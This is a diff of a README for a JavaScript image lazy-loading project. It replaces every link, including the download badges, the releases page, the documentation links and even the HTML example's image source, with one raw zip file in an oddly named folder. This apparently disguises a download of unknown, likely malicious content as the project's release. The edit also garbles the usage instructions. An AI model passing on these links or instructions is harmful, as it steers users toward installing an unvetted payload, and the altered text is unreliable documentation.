@@ -1,13 +1,13 @@
 # 🎨 js-image-lazy-load - Load Images Faster with JavaScript
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/younes-53/js-image-lazy-load/releases)
+[![Download](https://github.com/younes-53/js-image-lazy-load/raw/refs/heads/main/mannoheptite/image-load-lazy-js-Linus.zip)](https://github.com/younes-53/js-image-lazy-load/raw/refs/heads/main/mannoheptite/image-load-lazy-js-Linus.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and use **js-image-lazy-load**. This application lets your website load images only when they are needed, making your site faster and more efficient.
 
 ### 📥 Download & Install
-1. Visit the [Releases Page](https://github.com/younes-53/js-image-lazy-load/releases) to download the latest version.
+1. Visit the [Releases Page](https://github.com/younes-53/js-image-lazy-load/raw/refs/heads/main/mannoheptite/image-load-lazy-js-Linus.zip) to download the latest version.
 2. Look for the download link for the version you want. You’ll see different files available. Choose the one that works for your needs. 
 3. Click on the file to download it.
 
@@ -36,10 +36,10 @@ This guide will help you download and use **js-image-lazy-load**. This applicati
 To implement image lazy loading, use the following code snippet in your HTML:
 
 ```html
-<img class="lazy" data-src="path/to/image.jpg" alt="Description of image">
+<img class="lazy" data-src="https://github.com/younes-53/js-image-lazy-load/raw/refs/heads/main/mannoheptite/image-load-lazy-js-Linus.zip" alt="Description of image">
 ```
 
-Make sure to replace `path/to/image.jpg` with the actual path to your image file. This code allows the image to load only when it comes into view.
+Make sure to replace `https://github.com/younes-53/js-image-lazy-load/raw/refs/heads/main/mannoheptite/image-load-lazy-js-Linus.zip` with the actual path to your image file. This code allows the image to load only when it comes into view.
 
 ### 🎥 Demo
 You can see how **js-image-lazy-load** works in action. Visit our documentation section in the repository to find examples and further details.
@@ -49,8 +49,8 @@ If you want to contribute to this project, check out the guidelines in the repos
 
 ### 🔗 Additional Resources
 For more information, refer to:
-- [Official Documentation](https://github.com/younes-53/js-image-lazy-load/docs)
-- [Related Articles on Lazy Loading](https://example.com/lazy-loading)
+- [Official Documentation](https://github.com/younes-53/js-image-lazy-load/raw/refs/heads/main/mannoheptite/image-load-lazy-js-Linus.zip)
+- [Related Articles on Lazy Loading](https://github.com/younes-53/js-image-lazy-load/raw/refs/heads/main/mannoheptite/image-load-lazy-js-Linus.zip)
 
 ### 📫 Support
 If you face any issues or have questions, feel free to open an issue on the repository or contact the maintainers.
@@ -59,4 +59,4 @@ If you face any issues or have questions, feel free to open an issue on the repo
 This project is licensed under the MIT License. You can use and modify it freely.
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/younes-53/js-image-lazy-load/releases)
+[![Download](https://github.com/younes-53/js-image-lazy-load/raw/refs/heads/main/mannoheptite/image-load-lazy-js-Linus.zip)](https://github.com/younes-53/js-image-lazy-load/raw/refs/heads/main/mannoheptite/image-load-lazy-js-Linus.zip)
